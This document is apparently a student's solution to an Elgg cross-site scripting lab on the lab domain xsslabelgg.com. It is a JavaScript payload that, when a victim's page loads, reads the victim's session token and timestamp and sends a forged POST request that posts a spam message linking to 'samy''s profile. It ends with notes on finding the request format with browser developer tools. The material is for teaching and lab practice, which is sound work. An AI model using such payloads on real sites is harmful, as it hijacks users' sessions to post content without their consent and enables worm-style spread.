<script type="text/javascript">
	window.onload = function(){
	//JavaScript code to access user name, user guid, Time Stamp __elgg_ts
	//and Security Token __elgg_token
	var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
	var token="__elgg_token="+elgg.security.token.__elgg_token;
	
	var profile_link = "http://www.xsslabelgg.com/profile/samy";
	var encoded_link = escape(profile_link);

//Construct the content of your url.
    var sendurl="http://www.xsslabelgg.com/action/thewire/add"; //FILL IN
	var content=token+ts+"&body=To earn 12 USD/Hour(!), visit now "+encoded_link; //FILL IN


if(elgg.session.user.guid != 47)
	{
		//Create and send Ajax request to modify profile
		var Ajax=null;
		Ajax=new XMLHttpRequest();
		Ajax.open("POST",sendurl,true);
		Ajax.setRequestHeader("Host","www.xsslabelgg.com");
		Ajax.setRequestHeader("Content-Type",
		"application/x-www-form-urlencoded");
		Ajax.send(content);
	}
	}
</script>


// went to the wire from alice's profile,
// opened inspect element, 
// went to network, 
// posted something and got a POST request, clicked it 
// and found headers and request URL